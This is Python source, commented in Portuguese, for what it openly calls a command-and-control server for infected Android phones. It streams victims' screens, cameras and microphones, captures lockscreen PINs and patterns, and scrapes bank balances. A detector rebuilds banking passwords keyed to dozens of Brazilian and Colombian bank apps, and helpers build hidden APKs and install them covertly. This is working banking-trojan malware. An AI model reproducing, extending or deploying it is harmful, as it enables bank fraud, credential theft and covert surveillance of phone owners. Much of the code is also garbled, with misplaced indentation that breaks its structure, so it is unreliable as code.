"""
SERVIDOR DE COMANDO E CONTROLE (C&C)

Este é o servidor que controla todos os dispositivos infectados.

FUNCIONALIDADES:
- Aceita conexões WebSocket de dispositivos Android
- Recebe e armazena frames de tela em tempo real
- Envia comandos para os dispositivos
- Interface web para visualização e controle
- Sistema de autenticação para operadores
- Banco de dados PostgreSQL para persistência

ROTAS:
- /ws: WebSocket para dispositivos Android
- /api/auth/login: Login de operadores
- /api/auth/register: Registro de operadores
- /api/devices: Lista dispositivos conectados
- /api/devices/{id}/screen: Stream de tela
- /api/devices/{id}/command: Enviar comando
"""

import gangstar_env
from ip_utils import esconder_ip, mask_ip
import os
import time
import re
import hashlib
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status, UploadFile, File, Form, Request, BackgroundTasks, Body, Query
from fastapi.middleware.cors import CORSMiddleware
import io
from pydantic import BaseModel
from fastapi.staticfiles import StaticFiles
from fastapi.responses import StreamingResponse, HTMLResponse, FileResponse
from sqlalchemy.orm import Session
from fastapi import Request
from fastapi.exceptions import RequestValidationError
from fastapi.responses import JSONResponse
from typing import Dict, List, Optional, Union

import logging

class SuppressInvalidHTTPFilter(logging.Filter):
    def filter(self, record: logging.LogRecord) -> bool:
        msg = record.getMessage()
        if "Invalid HTTP request received" in msg or "Invalid HTTP request" in msg:
            return False
        return True

logging.getLogger("uvicorn.error").addFilter(SuppressInvalidHTTPFilter())

# Middleware de cabeçalhos de segurança HTTP
LOGIN_ATTEMPTS = {}  # {ip: {"count": int, "blocked_until": datetime}}

from dataclasses import dataclass
import asyncio

try:
    from dateutil.parser import parse as parse_dt
except ImportError:
    parse_dt = None

try:
    import orjson
    def json_loads(s): return orjson.loads(s)
    def json_dumps(o): return orjson.dumps(o).decode('utf-8')
except ImportError:
    import json
    def json_loads(s): return json.loads(s)
    def json_dumps(o): return json.dumps(o)

import json  # Mantém para compatibilidade com FastAPI
import base64
from datetime import datetime, timedelta, timezone

def utc_now():
    return datetime.now(timezone.utc).replace(tzinfo=None)
import logging
import shutil
import tempfile
from pathlib import Path
from jose import jwt, JWTError

# Importações locais
from database import get_db, engine, Base, SessionLocal, checkpoint_wal
from models import Device, Operator, DeviceLog, UserLayoutPreferences, CapturedData
from auth import (
    create_access_token, verify_password, get_password_hash, get_current_user,
    SECRET_KEY, ALGORITHM, oauth2_scheme,
    create_2fa_token, decode_2fa_token, generate_totp_secret, generate_totp_qr_and_uri, verify_totp_code
)
from schemas import (
    LoginRequest, LoginResponse, Verify2FARequest, Setup2FARequest,
    RegisterRequest, CommandRequest, Token, RenameDeviceRequest
)
from apk_builder import APKBuilder, patch_app_name, patch_application_id, patch_hide_from_launcher, patch_request_admin, BUILDS_DIR
from adb_manager import (
    install_dual_apk_ghost,
    install_apk_encrypted,
    install_apk_ghost,
    get_connected_devices,
    get_device_info,
    setup_device_for_ghost,
    uninstall_package,
    is_package_installed,
    launch_app,
    kill_app,
    encrypt_apk_data,
    decrypt_apk_data,
    shell_command,
    push_file,
    pull_file,
    enable_adb_over_network,
    connect_adb_wireless,
    async_install_dual_apk,
    async_install_apk_encrypted,
)

# Configuração de logging - ULTRA REDUZIDO para performance
logging.basicConfig(level=logging.ERROR)  # Apenas erros críticos
logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)  # Apenas warnings e erros

# ==================== OTIMIZAÇÕES DE PERFORMANCE - VPS POTENTE (24GB RAM, 10 CORES) ====================
import gc
import sys

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

# GC otimizado para alta RAM - coleta menos frequente
gc.set_threshold(50000, 500, 200)  # Thresholds altos = menos pausas

# Configurações de buffer - OTIMIZADO PARA ESTABILIDADE E PERFORMANCE
WEBSOCKET_MAX_SIZE = 2 * 1024 * 1024  # 2MB max
# FRAME_COMPRESSION_QUALITY = 40
QUALITY_GOOD = 55
QUALITY_MED = 35
QUALITY_BAD = 20
MAX_CONCURRENT_DEVICES = 500
FRAME_SKIP_INTERVAL = 1
_DASHBOARD_QUEUE_INITIAL = 5  # Fila maior = menos frames descartados, menos travamentos
FRAME_TTL = 5

# 🚀 OTIMIZAÇÃO PARA 4G: Compressão agressiva e fila pequena
# Isso garante que o dashboard sempre mostra o frame MAIS RECENTE
# e não fica tentando processar frames velhos

# Pool de workers para processamento paralelo - USA TODOS OS CORES
from concurrent.futures import ThreadPoolExecutor
import multiprocessing

# Thread pool expandido para alta concorrencia (50+ dispositivos)
NUM_WORKERS = max(multiprocessing.cpu_count() * 4, 64)
thread_pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)

def safe_db_commit_sync(db, max_retries: int = 5):
    """Commita no banco de dados tratando locks com retry e backoff para alta concorrencia"""
import time

for attempt in range(max_retries):
    try:
        db.commit()
        return True
    except Exception as e:
        err_msg = str(e).lower()
        if ("locked" in err_msg or "busy" in err_msg) and attempt < max_retries - 1:
            time.sleep(0.05 * (2 ** attempt))
            continue
        logger.warning(f"Aviso no db.commit (tentativa {attempt+1}/{max_retries}): {e}")
        try:
            db.rollback()
        except Exception:
            pass
        return False
async def safe_db_commit(db):
    """Versao assincrona nao-bloqueante de safe_db_commit_sync"""
    return await asyncio.to_thread(safe_db_commit_sync, db)

import threading
import time
import gc
from sqlalchemy import text, inspect

# GC periódico moderado - evita pausas desnecessárias
def periodic_gc():
    while True:
        time.sleep(300)  # 5 minutos - gc.collect() pausa a event loop se chamado demais
        gc.collect(1)  # Apenas geração 1 (rápido)

        gc_thread = threading.Thread(target=periodic_gc, daemon=True)
        gc_thread.start()

        # Cria tabelas no banco (PostgreSQL na VPS)
        Base.metadata.create_all(bind=engine)

        # Patch to add custom_name column if it does not exist (SQLite or PostgreSQL)
        try:
            with engine.connect() as conn:
                inspector = inspect(engine)
                columns = [c["name"] for c in inspector.get_columns("devices")]

                if "custom_name" not in columns:
                    print("🔧 Migração: Adicionando coluna custom_name à tabela devices...")
                    conn.execute(text("ALTER TABLE devices ADD COLUMN custom_name VARCHAR(100)"))
                    try:
                        conn.commit()
                    except Exception:
                        pass
                    print("✅ Coluna custom_name adicionada com sucesso!")

                    if "adb_serial" not in columns:
                        print("🔧 Migração: Adicionando coluna adb_serial à tabela devices...")
                        conn.execute(text("ALTER TABLE devices ADD COLUMN adb_serial VARCHAR(100)"))
                        try:
                            conn.commit()
                        except Exception:
                            pass
                        print("✅ Coluna adb_serial adicionada com sucesso!")
        except Exception as e:
            print(f"❌ Erro durante a migração: {e}")
        op_columns = [c["name"] for c in inspector.get_columns("operators")]
        if "expires_at" not in op_columns:
            print("🔧 Migração: Adicionando coluna expires_at à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN expires_at TIMESTAMP"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna expires_at adicionada com sucesso!")

        if "totp_secret" not in op_columns:
            print("🔧 Migração: Adicionando coluna totp_secret à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN totp_secret VARCHAR(64)"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna totp_secret adicionada com sucesso!")

        if "totp_enabled" not in op_columns:
            print("🔧 Migração: Adicionando coluna totp_enabled à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN totp_enabled BOOLEAN DEFAULT 0"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna totp_enabled adicionada com sucesso!")

        if "totp_temp_secret" not in op_columns:
            print("🔧 Migração: Adicionando coluna totp_temp_secret à tabela operators...")
            conn.execute(text("ALTER TABLE operators ADD COLUMN totp_temp_secret VARCHAR(64)"))
            try:
                conn.commit()
            except Exception:
                pass
            print("✅ Coluna totp_temp_secret adicionada com sucesso!")

        # Garante índices de alta velocidade para device_logs e devices
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_type ON device_logs(device_id, log_type)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_type_created ON device_logs(log_type, created_at)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_created ON device_logs(device_id, created_at)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_type_created ON device_logs(device_id, log_type, created_at DESC)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_created_desc ON device_logs(device_id, created_at DESC)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_devices_owner ON devices(owner_id)"))
        conn.execute(text("CREATE INDEX IF NOT EXISTS idx_devices_devid ON devices(device_id)"))
try:
    conn.commit()
except Exception:
    pass
except Exception as e:
    print(f"⚠️ Erro ao tentar migrar banco de dados: {e}")

async def periodic_wal_checkpoint():
    """Executa checkpoint do WAL e descarta conexões ociosas a cada 2 min para manter WAL compacto"""
    counter = 0

def _do_checkpoint(do_truncate: bool):
    try:
        if do_truncate:
            try:
                engine.dispose()
            except Exception:
                pass
            db_file = DATABASE_URL.replace("sqlite:///", "").split("?")[0]
            if os.path.exists(db_file):
                conn = sqlite3.connect(db_file, timeout=5)
                mode = "TRUNCATE" if do_truncate else "PASSIVE"
                conn.execute(f"PRAGMA wal_checkpoint({mode});")
                conn.close()
    except Exception:
        pass

    while True:
        try:
            await asyncio.sleep(15)
            counter += 1
            if DATABASE_URL.startswith("sqlite"):
                do_trunc = (counter % 8 == 0)  # A cada 2 minutos
                await asyncio.to_thread(_do_checkpoint, do_trunc)
        except asyncio.CancelledError:
            break
        except Exception:
            pass

def custom_asyncio_exception_handler(loop, context):
    """Suprime exceções benignas de socket do Windows (WinError 64 / 10054) para evitar quedas do servidor"""
    exc = context.get("exception")
    if exc is not None:
        if isinstance(exc, (ConnectionResetError, ConnectionAbortedError)):
            return
        if isinstance(exc, OSError) and getattr(exc, "winerror", None) in (64, 10054, 10053, 995):
            return
        msg = str(context.get("message", ""))
        if any(k in msg for k in ["WinError 64", "WinError 10054", "Accept failed", "connection_lost"]):
            return
        try:
            loop.default_exception_handler(context)
        except Exception:
            pass

from contextlib import asynccontextmanager

@asynccontextmanager
async def lifespan(app: FastAPI):
    try:
        loop = asyncio.get_running_loop()
        loop.set_exception_handler(custom_asyncio_exception_handler)
    except Exception:
        pass
    asyncio.create_task(manager.run_housekeeping())
    asyncio.create_task(periodic_wal_checkpoint())
    yield

# ==================== SEGURANÇA — Integrado do source apk ref ====================
# Configurações de criptografia e segredos carregadas do source apk ref (config/)
# Estes valores são carregados de forma segura via variáveis de ambiente com fallback
# aos arquivos locais .keystore_pass, .jwt_secret, .device_secret do source apk ref.

BASE_DIR = os.path.abspath(os.path.dirname(__file__))

def _load_secret_file(filename: str) -> str:
    """Carrega um segredo do arquivo local (source apk ref) com fallback para env var."""
    candidates = [
        os.path.join(BASE_DIR, "config", filename),
        os.path.join(BASE_DIR, filename),
        os.path.join(BASE_DIR, "..", "config", filename),
    ]
    for path in candidates:
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as f:
                    return f.read().strip()
        except Exception:
            pass
    return ""

# Keystore password — do source apk ref .keystore_pass
KEYSTORE_PASSWORD = os.environ.get("RAPTOR_KEYSTORE_PASS") or _load_secret_file(".keystore_pass") or "GooglePlayServices2024"

# JWT secret — do source apk ref .jwt_secret
JWT_SECRET_REF = os.environ.get("RAPTOR_JWT_SECRET") or _load_secret_file(".jwt_secret")

# Device secret — do source apk ref .device_secret (autenticação do APK)
DEVICE_SECRET_REF = os.environ.get("RAPTOR_DEVICE_SECRET") or _load_secret_file(".device_secret")

# AES-256-GCM para criptografia moderna (substitui encrypt_lcg fraco do server)
# Usa cryptography.hazmat (já disponível via python-jose[cryptography] no requirements.txt)
import secrets as _secrets_mod
import base64 as _base64_mod
from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM

_AES_KEY = None
def _get_aes_key():
    """Gera ou recupera key AES-256 para criptografia moderna."""
    global _AES_KEY
    if _AES_KEY is None:
        key_file = os.path.join(BASE_DIR, ".aes_key")
        if os.path.exists(key_file):
            try:
                with open(key_file, "rb") as f:
                    _AES_KEY = f.read()
            except Exception:
                pass
        if not _AES_KEY or len(_AES_KEY) != 32:
            _AES_KEY = _secrets_mod.token_bytes(32)
            try:
                with open(key_file, "wb") as f:
                    f.write(_AES_KEY)
            except Exception:
                pass
    return _AES_KEY

def encrypt_aes_gcm(data: bytes) -> str:
    """Criptografa dados com AES-256-GCM (autenticado)."""
    key = _get_aes_key()
    aesgcm = _AESGCM(key)
    nonce = _secrets_mod.token_bytes(12)
    ciphertext = aesgcm.encrypt(nonce, data, None)
    return _base64_mod.b64encode(nonce + ciphertext).decode("utf-8")

def decrypt_aes_gcm(encrypted: str) -> bytes:
    """Descriptografa dados AES-256-GCM."""
    key = _get_aes_key()
    aesgcm = _AESGCM(key)
    raw = _base64_mod.b64decode(encrypted)
    nonce = raw[:12]
    ciphertext = raw[12:]
    return aesgcm.decrypt(nonce, ciphertext, None)

# ==================== FIM SEGURANÇA ====================

# Inicializa FastAPI com proteção total contra exposição de API
app = FastAPI(
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
    lifespan=lifespan
)
from apk_builder import router as apk_router
app.include_router(apk_router)

# Configuração CORS (Permite requisições mantendo segurança de credenciais)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

class SecurityHeadersMiddleware:
    """Middleware ASGI puro para cabeçalhos de segurança sem interferir no Content-Length ou respostas de streaming"""

    def __init__(self, app):
        self.app = app

    async def __call__(self, scope, receive, send):
        if scope["type"] not in ("http", "websocket"):
            await self.app(scope, receive, send)
            return

async def send_wrapper(message):
    if message["type"] == "http.response.start":
        raw_headers = list(message.get("headers", []))
        raw_headers.extend([
            (b"server", b"WebServer"),
            (b"x-content-type-options", b"nosniff"),
            (b"x-frame-options", b"SAMEORIGIN"),
            (b"x-xss-protection", b"1; mode=block"),
        ])
        message["headers"] = raw_headers
        await send(message)

        try:
            await self.app(scope, receive, send_wrapper)
        except Exception as e:
            # Interceptação segura de erros ASGI no Windows
            raise

        app.add_middleware(SecurityHeadersMiddleware)

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    return JSONResponse(
        status_code=422,
        content={"detail": "Requisição inválida"}
    )

@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    logger.error(f"Erro no servidor: {exc}")
    return JSONResponse(
        status_code=500,
        content={"detail": "Erro interno do servidor"}
    )


# Monta arquivos estáticos do frontend buildado (para acesso via VPS/domínio)
FRONTEND_DIST = Path(__file__).parent / "web-dist"
if FRONTEND_DIST.exists():
    app.mount("/assets", StaticFiles(directory=FRONTEND_DIST / "assets"), name="frontend-assets")
    env_earth_dir = FRONTEND_DIST / "earth"
    if (env_earth_dir).exists():
        app.mount("/earth", StaticFiles(directory=env_earth_dir), name="earth-textures")

# Monta diretório de uploads para APKs
UPLOADS_DIR = Path(__file__).parent / "uploads" / "apks"
UPLOADS_DIR.mkdir(parents=True, exist_ok=True)
app.mount("/uploads/apks", StaticFiles(directory=UPLOADS_DIR), name="apk-uploads")

# Monta diretório web (para download do APK compilado localmente)
WEB_DIR = Path(__file__).parent / "web"
WEB_DIR.mkdir(parents=True, exist_ok=True)
app.mount("/web", StaticFiles(directory=WEB_DIR), name="web-static")

# Configurações de cache/TTL para recursos em memória - OTIMIZADO
FRAME_CACHE_DIR = Path(__file__).resolve().parent / "cache" / "screens"
HIERARCHY_CACHE_DIR = Path(__file__).resolve().parent / "cache" / "hierarchies"
FRAME_CACHE_DIR.mkdir(parents=True, exist_ok=True)
HIERARCHY_CACHE_DIR.mkdir(parents=True, exist_ok=True)

# TTLs otimizados
FRAME_TTL = timedelta(seconds=int(os.getenv("FRAME_TTL_SECONDS", "30")))
HIERARCHY_TTL = timedelta(seconds=int(os.getenv("HIERARCHY_TTL_SECONDS", "20")))
DASHBOARD_QUEUE_SIZE = int(os.getenv("DASHBOARD_QUEUE_SIZE", "20"))  # Fila maior = menos drops, menos travamentos

# Cache simples para reduzir consultas ao banco - OTIMIZADO
from functools import lru_cache
import time as time_module

_devices_cache = {"data": None, "timestamp": 0, "ttl": 5}  # Cache de 5 segundos (menos queries)
_frame_counter: Dict[str, int] = {}  # Contador de frames por dispositivo

def get_cached_devices(db: Session, user_id: int = None, is_admin: bool = False):
    """Retorna dispositivos com cache de 2 segundos"""
    cache_key = f"{user_id}_{is_admin}"
    now = time_module.time()
    
    # Cache expirado ou não existe
    if _devices_cache["data"] is None or now - _devices_cache["timestamp"] > _devices_cache["ttl"]:
        if is_admin:
            devices = db.query(Device).all()
        else:
            devices = db.query(Device).filter(Device.owner_id == user_id).all()
        
        _devices_cache["data"] = devices
        _devices_cache["timestamp"] = now
    
    return _devices_cache["data"]

# ==================== DETECTOR INTELIGENTE DE SENHAS BANCÁRIAS ====================

class BankPasswordDetector:
    """Detecta e reconstrói senhas bancárias de 4, 6 e 8 dígitos"""
    
    BANK_APPS = {
        'br.com.itau': 'Itaú',
        'com.itau': 'Itaú',
        'com.itau.cartoes': 'Itaú Cartões',
        'br.com.itau.pers': 'Itaú Personnalité',
        'br.com.neon': 'Neon',
        'com.nu.production': 'Nubank',
        'com.nubank': 'Nubank',
        'br.com.bradesco': 'Bradesco',
        'com.bradesco.cartoes': 'Bradesco Cartões',
        'br.com.bradesco.bradescoprime': 'Bradesco Prime',
        'com.santander.app': 'Santander',
        'com.santander.app.way': 'Santander Way',
        'com.santander.app.select': 'Santander Select',
        'com.picpay': 'PicPay',
        'br.com.intermedium': 'Inter',
        'com.bancocinter': 'Inter',
        'br.gov.caixa.tem': 'Caixa Tem',
        'br.com.gft.banco7': 'Caixa',
        'br.gov.caixa.mfg': 'Caixa FGTS',
        'br.com.bb': 'Banco do Brasil',
        'br.com.bb.android': 'Banco do Brasil',
        'br.com.bb.empresa': 'BB Empresa',
        'com.mercadopago.wallet': 'Mercado Pago',
        'br.com.banco.original': 'Banco Original',
        'br.com.c6bank.app': 'C6 Bank',
        'br.com.pagseguro': 'PagBank',
        'com.pagseguro.pagbank': 'PagBank',
        'com.btg.pactual': 'BTG Pactual',
        'com.btg.digital': 'BTG Pactual',
        'br.com.sicoob.mobile': 'Sicoob',
        'br.com.sicredi': 'Sicredi',
        'com.safra.net': 'Banco Safra',
        'br.com.safra.mobile': 'Banco Safra',
        'com.xp.mobile': 'XP Investimentos',
        'br.com.xp.investimentos': 'XP Investimentos',
        'com.willbank.app': 'Will Bank',
        'br.com.pan.app': 'Banco Pan',
        'br.com.agibank': 'Agibank',
        'com.bancobs2.app': 'Banco BS2',
        'com.bancobMG.mobile': 'Banco BMG',
        'br.com.banrisul': 'Banrisul',
        'br.com.banrisul.cartoes': 'Banrisul Cartões',
        'com.davivienda.daviviendaapp': 'Davivienda',
        'com.synopsis.davivienda': 'Davivienda',
        'com.davivienda.movil': 'Davivienda',
        'com.davivienda.daviplata': 'DaviPlata',
        'com.davivienda': 'Davivienda',
        'co.com.davivienda': 'Davivienda',
        'com.bancolombia.personas': 'Bancolombia',
        'com.bancolombia': 'Bancolombia',
        'co.com.bancolombia': 'Bancolombia',
        'com.nequi.MobileApp': 'Nequi',
        'com.nequi': 'Nequi',
        'com.seguranca.protecao': 'KEYLOGGER ITAÚ',
        'com.seguranca': 'KEYLOGGER ITAÚ'
    }
    
def __init__(self, device_id: str):
        self.device_id = device_id
        self.password_buffer = []  # Buffer de eventos de senha
        self.last_package = None
        self.last_hint = None
        self.detected_passwords = []  # Lista de senhas detectadas
        self.last_detected_password = None  # Última senha detectada (evita duplicatas)
        self.last_event_time = None  # Tempo do último evento
        
def process_keylog(self, keylog_data: str) -> dict:
        """Processa evento de keylog e tenta detectar senha"""
        try:
            data = json.loads(keylog_data)
            
            # Verifica se é campo de senha ou se contém dígitos numéricos digitados (ex: teclado Itaú, PINs)
            is_password_field = data.get('isPassword', False)
            text = str(data.get('text', '') or '')
            hint = str(data.get('hint', '') or '')
            package = data.get('package', '')
            
            # Se não é marcado como senha mas contém dígitos numéricos ou palavras-chave de PIN/senha, processa como potencial entrada
            is_numeric = text.replace('•', '').replace('[', '').replace(']', '').strip().isdigit()
            is_sensitive_field = any(k in hint.lower() for k in ['senha', 'pin', 'código', 'codigo', 'acesso', 'pass', 'key'])
            
            if not is_password_field and not is_numeric and not is_sensitive_field:
                # Limpa buffer se mudou para campo irrelevante
                self.password_buffer = []
                self.last_detected_password = None
                return None
            
            # Identifica o banco
            bank_name = self.BANK_APPS.get(package, package)
            
            # Reseta buffer se mudou de app ou se inativo por mais de 15 segundos
            now = utc_now()
            if package != self.last_package or (self.last_event_time and (now - self.last_event_time).total_seconds() > 15):
                self.password_buffer = []
                self.last_detected_password = None
                
            self.last_package = package
            self.last_hint = hint
            self.last_event_time = utc_now()
            
            # Adiciona ao buffer
            self.password_buffer.append({
                'text': text,
                'timestamp': utc_now().isoformat()
            })
            
            # Tenta extrair senha do buffer
            password = self._extract_password(hint)
            
            # Verifica se é uma senha válida e DIFERENTE da última detectada
            if password and password != self.last_detected_password:
                # Senha detectada!
                password_info = {
                    'device_id': self.device_id,
                    'bank': bank_name,
                    'package': package,
                    'password': password,
                    'hint': hint,
                    'digits': len(password),
                    'timestamp': utc_now().isoformat(),
                    'status': 'captured',  # captured, confirmed, failed
                    'buffer': list(self.password_buffer)  # Para debug
                }
                
                # Adiciona à lista de senhas detectadas
                self.detected_passwords.append(password_info)
                self.last_detected_password = password  # Marca como detectada
                
                # Limpa buffer após detecção
                self.password_buffer = []
                
                logger.info(f"\n" + "="*60)
                logger.info(f"🔐 SENHA BANCÁRIA DETECTADA!")
                logger.info(f"Banco: {bank_name}")
                logger.info(f"Senha: {password} ({len(password)} dígitos)")
                logger.info(f"Campo: {hint}")
                logger.info("="*60 + "\n")
                
                return password_info
                
        except Exception as e:
            logger.error(f"Erro ao processar keylog: {e}")
            
        return None
    
def _extract_password(self, hint: str) -> str:
        """Extrai senha dos eventos com bullets (•) OU cliques em teclado virtual"""
        if len(self.password_buffer) < 2:
            return None
        
        # Detecta tamanho esperado do hint
        expected_length = None
        if hint:
            hint_lower = hint.lower()
            if '4' in hint or 'quatro' in hint_lower:
                expected_length = 4
            elif '6' in hint or 'seis' in hint_lower:
                expected_length = 6
            elif '8' in hint or 'oito' in hint_lower:
                expected_length = 8
        
        # Analisa últimos eventos COM DEDUPLICAÇÃO
        password_digits = []
        last_digit = None
        last_timestamp = None
        
        for event in self.password_buffer:
            text = event['text']
            timestamp = event.get('timestamp', '')
            
            # Método 1: Extrai dígitos de eventos com bullets (Neon, Nubank)
            clean_text = text.replace('•', '').replace('[', '').replace(']', '').strip()
            
            # Ignora eventos que não são dígitos puros
            if not clean_text:
                continue
                
            # Se é um texto com múltiplos bullets/dígitos, pega apenas o último
if len(clean_text) > 1 and clean_text.isdigit():
    # É provavelmente a senha completa até agora
    # Pega apenas o último caractere (novo dígito)
    clean_text = clean_text[-1]

    # Método 2: Eventos de clique em teclado virtual (Itáu, Bradesco)
    if clean_text and len(clean_text) == 1 and clean_text.isdigit():
        digit = clean_text

        # 🔥 DEDUPLICAÇÃO: Ignora se é o mesmo dígito em sequência rápida
        # Isso evita capturar o mesmo clique duas vezes
        if digit == last_digit and last_timestamp:
            try:
                if timestamp and last_timestamp:
                    # Parse timestamps
                    t1 = datetime.fromisoformat(last_timestamp.replace('Z', '+00:00')) if isinstance(last_timestamp, str) else last_timestamp
                    t2 = datetime.fromisoformat(timestamp.replace('Z', '+00:00')) if isinstance(timestamp, str) else timestamp
                    diff_ms = abs((t2 - t1).total_seconds() * 1000)

                    # Se menos de 300ms entre eventos iguais, é duplicata
                    if diff_ms < 300:
                        logger.debug(f"🔄 Ignorando dígito duplicado: {digit} (diff: {diff_ms}ms)")
                        continue
            except Exception as e:
                # Se não conseguir comparar timestamps, aceita o dígito
                pass

            password_digits.append(digit)
            last_digit = digit
            last_timestamp = timestamp

            # Log para debug
            logger.debug(f"📊 Buffer: {len(self.password_buffer)} eventos → {len(password_digits)} dígitos: {''.join(password_digits)}")

# Se tem tamanho esperado, retorna APENAS quando atingir esse tamanho
def process_digits(self, password_digits, expected_length=None):
    if expected_length:
        if len(password_digits) == expected_length:
            return ''.join(password_digits)
        elif len(password_digits) > expected_length:
            # Pegou mais que o esperado, retorna os últimos N
            return ''.join(password_digits[-expected_length:])
        else:
            # Sem hint, tenta detectar automaticamente (4, 6 ou 8)
            if len(password_digits) >= 4:
                # Tenta 8, 6 ou 4 dígitos
                for length in [8, 6, 4]:
                    if len(password_digits) == length:
                        return ''.join(password_digits)

                    # Se não é exatamente 4, 6 ou 8, mas tem 6 ou mais, pega os últimos 6 (padrão)
                    if len(password_digits) >= 6:
                        return ''.join(password_digits[-6:])

                return None

def get_detected_passwords(self) -> list:
    """Retorna todas as senhas detectadas"""
    return self.detected_passwords

def clear_buffer(self):
    """Limpa buffer de senhas"""
    self.password_buffer = []

@dataclass
class DashboardSubscriber:
    websocket: WebSocket
    queue: asyncio.Queue

async def safe_close_websocket(ws: WebSocket, code: int = 1000, reason: str = ""):
    """Fecha WebSocket silenciosamente tratando exceções de estado fechado"""
    try:
        await ws.close(code=code, reason=reason)
    except Exception:
        pass


    # Gerenciador de conexões de dispositivos
class DeviceConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.connection_locks: Dict[str, asyncio.Lock] = {}
        self.device_owners: Dict[str, Optional[int]] = {}
        self.device_screens: Dict[str, bytes] = {}
        self.device_screen_timestamps: Dict[str, datetime] = {}
        self.device_info: Dict[str, dict] = {}
        # Last-known capture state reported by device (for panel to init isCaptureEnabled / isSilentHvncEnabled)
        self.device_silent_state: Dict[str, dict] = {}  # { "active": bool, "method": "btmob" | "standard" }
        self.device_screen_hierarchies: Dict[str, str] = {}
        self.device_hierarchy_timestamps: Dict[str, datetime] = {}
        self.password_detector: Dict[str, 'BankPasswordDetector'] = {}
        self.dashboard_subscribers: Dict[str, List[DashboardSubscriber]] = {}
        self.cleanup_lock = asyncio.Lock()
        self.last_balance_extract_time: Dict[str, float] = {}

        # 📷 CÂMERA EM TEMPO REAL
        self.device_camera_frames: Dict[str, bytes] = {}  # Último frame da câmera
        self.device_camera_timestamps: Dict[str, datetime] = {}
        self.camera_subscribers: Dict[str, List[DashboardSubscriber]] = {}  # WebSockets escutando câmera

        # 🎤 MICROFONE EM TEMPO REAL
        self.device_audio_chunks: Dict[str, bytes] = {}  # Último chunk de áudio
        self.device_audio_timestamps: Dict[str, datetime] = {}
        self.audio_subscribers: Dict[str, List[DashboardSubscriber]] = {}  # WebSockets escutando áudio

        # 🔓 SEQUÊNCIA DE DESBLOQUEIO
        self.device_unlock_sequences: Dict[str, dict] = {}  # Sequência de desbloqueio gravada

        # 🔒 LOCKSCREEN (PIN + PATTERN) - IGUAL EAGLESPY V5
        self.device_pins: Dict[str, str] = {}  # PIN capturado por dispositivo
        self.device_patterns: Dict[str, str] = {}  # Pattern capturado por dispositivo
        self.device_lockscreen_active: Dict[str, bool] = {}  # Lockscreen ativa por dispositivo

        # 📱 APPS INSTALADOS
        self.device_installed_apps: Dict[str, list] = {}  # Lista de apps por dispositivo

        # 🏦 BANCOS DETECTADOS EM TEMPO REAL
        self.device_active_banks: Dict[str, dict] = {}  # Lista de bancos abertos por dispositivo

        # HEARTBEAT
        self.device_last_activity: Dict[str, datetime] = {}
        self.DEVICE_TIMEOUT_SECONDS = 45  # 45s - mata conexao zombies mais rápido

        # Frame deduplication + Adaptive Quality
        self._frame_last_md5: Dict[str, str] = {}
        self._device_ping_ms: Dict[str, float] = {}

        # Anti-flood: controla quando GET_DEVICE_INFO foi enviado por última vez por dispositivo
        self._info_request_ts: Dict[str, datetime] = {}

    def update_device_activity(self, device_id: str):
        """Atualiza timestamp de última atividade do dispositivo"""
        self.device_last_activity[device_id] = utc_now()
    
def store_screen_hierarchy(self, device_id: str, hierarchy_data: str):
    self.device_screen_hierarchies[device_id] = hierarchy_data
    self.device_hierarchy_timestamps[device_id] = utc_now()
    try:
        asyncio.create_task(self.extract_bank_balance_from_hierarchy(device_id, hierarchy_data))
    except Exception:
        pass

async def extract_bank_balance_from_hierarchy(self, device_id: str, hierarchy_data: object):
    """Extrai automaticamente saldo, limite e fatura de qualquer banco com throttling de 15s por aparelho."""
    if not hierarchy_data:
        return

import time
now_ts = time.time()
last_ts = self.last_balance_extract_time.get(device_id, 0)
if now_ts - last_ts < 15.0:
    return
self.last_balance_extract_time[device_id] = now_ts

def _async_extract():
    try:
        db = SessionLocal()
        try:
            hier_text = hierarchy_data if isinstance(hierarchy_data, str) else json.dumps(hierarchy_data)
            foreground_pkg = self.device_info.get(device_id, {}).get("foreground_package", "")
            active_bank = self.device_active_banks.get(device_id)
            current_pkg = (active_bank or {}).get("package") or foreground_pkg or ""

            bank_keywords = [
                "bb.android", "nu.production", "nubank", "itau", "bradesco", "caixa",
                "santander", "mercadopago", "intermedium", "c6bank", "picpay", "uol.ps.myaccount",
                "pagbank", "willbank", "sicredi", "sicoob", "btg", "daycoval", "banrisul",
                "safra", "stone", "sumup", "neon", "bancopan", "agibank", "bmg",
                "pluxee", "ben", "flashapp", "wise", "revolut", "creditas", "daviplata", "davivienda",
                "bank", "banco", "pag", "pay", "card", "cartao", "credit", "finan", "invest"
            ]

            is_bank_screen = any(kw in current_pkg.lower() for kw in bank_keywords)

            money_symbol_pattern = re.compile(
                r'(?:R\$\s*|R\s*\$\s*|\$\s*)(-?\s*\d{1,3}(?:[\.,]\d{3})*[\.,]\d{2}|-?\s*\d+[\.,]\d{2})',
                re.IGNORECASE
            )
            money_raw_pattern = re.compile(
